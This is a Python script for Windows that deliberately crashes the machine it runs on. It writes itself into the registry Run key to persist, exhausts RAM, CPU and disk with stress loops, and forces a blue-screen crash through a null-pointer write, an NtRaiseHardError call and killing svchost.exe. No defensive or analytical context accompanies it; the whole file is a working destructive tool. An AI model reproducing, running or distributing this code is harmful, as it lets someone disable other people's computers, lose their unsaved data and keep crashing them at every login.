import os
import sys
import ctypes
import threading
import multiprocessing
import random
import time
import winreg


ChunkSize = 1000  
CPUThreads = multiprocessing.cpu_count() * 2  



ram_blocks = []


def startup():
    try:
       
        script_path = os.path.abspath(sys.argv[0])
        
      
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, 
            winreg.KEY_SET_VALUE
        )
        
      
        winreg.SetValueEx(
            key,                
            "MyScript",        
            0,                 
            winreg.REG_SZ,     
            f'"{script_path}"'  
        )
        
        winreg.CloseKey(key)
        print("[+] Successfully added to startup!")
        return True
    except Exception as e:
        print(f"[-] Error adding to startup: {e}")
        return False

def prepare_bsod():
    try:
        ntdll = ctypes.WinDLL('ntdll.dll')
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool(False)))
    except:
        pass


def ram_stress():
    global ram_blocks
    chunk = ChunkSize * 1024 * 1024
    while True:
        try:
            
            block = bytearray(os.urandom(chunk))
            for i in range(0, len(block), 4096):
                block[i] = (block[i] + 1) % 256
            ram_blocks.append(block)
            print(f"RAM: {len(ram_blocks) * ChunkSize} MB")
            
            
            if len(ram_blocks) >= 4:
                force_bsod()
        except MemoryError:
            force_bsod()
        time.sleep(0.1)

def cpu_stress():
    while True:
        [random.random() ** random.random() for _ in range(1_000_000)]

def disk_stress():
    while True:
        try:
            with open('crash.tmp', 'wb+') as f:
                f.write(os.urandom(500 * 1024 * 1024))  # 500MB writes
            os.remove('crash.tmp')
        except:
            pass


def force_bsod():
    try:
       
        ctypes.memset(0, 0, 1)
    except:
        try:
           
            ntdll = ctypes.WinDLL('ntdll.dll')
            ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong(0)))
        except:
           
            os.system("taskkill /f /im svchost.exe")


if __name__ == "__main__":
    prepare_bsod()
      

    
    threading.Thread(target=ram_stress, daemon=True).start()
    
    for _ in range(CPUThreads):
        multiprocessing.Process(target=cpu_stress, daemon=True).start()
    
    
    threading.Thread(target=disk_stress, daemon=True).start()

  
    while True:
        startup()
        time.sleep(1)
